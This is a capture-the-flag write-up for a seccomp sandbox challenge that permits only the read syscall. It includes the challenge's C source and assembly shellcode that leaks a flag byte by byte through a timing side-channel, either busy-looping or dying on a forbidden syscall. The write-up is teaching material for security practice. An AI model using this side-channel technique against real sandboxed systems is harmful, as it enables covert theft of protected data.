#metadata(
  (
    title: "Sandboxing Level 12",
    description: "Writeup for Sandboxing Level 12",
    date: "2026-01-01",
    order: 12,
    draft: true,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```



#table(
  columns: (auto, 1fr),
  inset: 10pt,
  align: (right, left),
  [*Title*], [Timing side-channel via Busy Loop],
  [*Date*], [2025-12-30],
  [*Description*],
  [Using an infinite calculation loop to create a timing side-channel for leaking data when all traditional output syscalls are blocked.],
)

= Babyjail Level 12

== Introduction

This challenge represents the most restrictive sandbox in the series. Only the `read` system call is permitted. All other syscalls, including `exit` and `nanosleep`, are blocked. Traditional side-channels like exit codes or deliberate sleeping are unavailable.

== Vulnerability Analysis

A file descriptor to the flag (FD 3) is opened before the seccomp filter is applied. While we can read the flag into memory, we cannot use any system call to communicate its content back to user-space.

However, we can still use CPU execution time as a side-channel. By either hanging the process or letting it be killed immediately, we can leak information.

== Exploitation Steps

=== 1. Reading the Flag
The shellcode reads the flag from the pre-opened file descriptor.

```nasm
/* read(3, buf, 100) */
mov rdi, 3
mov rsi, buf_addr
mov rdx, 100
mov rax, 0
syscall
```

=== 2. CPU Timing Side-Channel
We compare a specific byte of the flag with a guess. If the guess is correct, the shellcode enters an infinite busy loop (`jmp $`). If the guess is incorrect, the shellcode executes a forbidden syscall (e.g., `write`), which causes seccomp to kill the process immediately.

```nasm
/* if buf[index] == guess: busy_loop */
movzx rax, byte ptr [buf_addr + index]
cmp rax, guess
je busy_loop

/* forbidden syscall to kill process */
mov rax, 1
syscall

busy_loop:
jmp busy_loop
```

=== 3. Automated Reconstruction
A python script iterates through each character position and possible values. It measures how long the process stays alive after the shellcode starts. If the process is still running after a significant delay (e.g., 1 second), it indicates a correct guess. The script then kills the hanging process and moves to the next byte.

The retrieved flag was: `falg\n`.

